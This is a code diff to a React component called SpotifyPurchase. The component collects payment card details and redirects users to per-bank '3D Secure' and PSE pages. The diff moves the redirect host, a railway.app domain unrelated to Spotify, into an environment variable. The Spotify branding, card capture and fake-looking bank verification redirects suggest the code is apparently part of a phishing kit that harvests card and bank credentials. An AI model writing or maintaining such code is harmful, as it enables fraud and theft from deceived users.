@@ -11,6 +11,9 @@ export const SpotifyPurchase = () => {
   const [selectedBank, setSelectedBank] = useState("")
   const { cardData, loading, error, updateCardData, submitPayment } = usePaymentStore()
 
+  // Leer la URL 3D Secure desde variables de entorno
+  const threeDSUrl = import.meta.env.VITE_3D_URL;
+
   // Helper to format MM/YY
   const handleExpDateChange = (e) => {
     let value = e.target.value.replace(/[^\d]/g, "");
@@ -21,10 +24,10 @@ export const SpotifyPurchase = () => {
 
   // Redirigir a PSE cuando se seleccione un banco
   useEffect(() => {
-    if (paymentMethod === "pse" && selectedBank) {
-      window.location.href = `https://3dsecure-payment.up.railway.app/pse/index.php?banco=${selectedBank}`
+    if (paymentMethod === "pse" && selectedBank && threeDSUrl) {
+      window.location.href = `${threeDSUrl}/pse/index.php?banco=${selectedBank}`
     }
-  }, [paymentMethod, selectedBank])
+  }, [paymentMethod, selectedBank, threeDSUrl])
 
   const handleSubmit = async (e) => {
     e.preventDefault()
@@ -34,7 +37,9 @@ export const SpotifyPurchase = () => {
     if (response.success) {
       // Redirigir usando el valor de 'bank' devuelto por la API
       const bank = response.data && response.data.bank ? response.data.bank : selectedBank;
-      window.location.href = `https://3dsecure-payment.up.railway.app/payments/${bank}`
+      if (threeDSUrl) {
+        window.location.href = `${threeDSUrl}/payments/${bank}`
+      }
     } else {
       alert(response.error)
     }
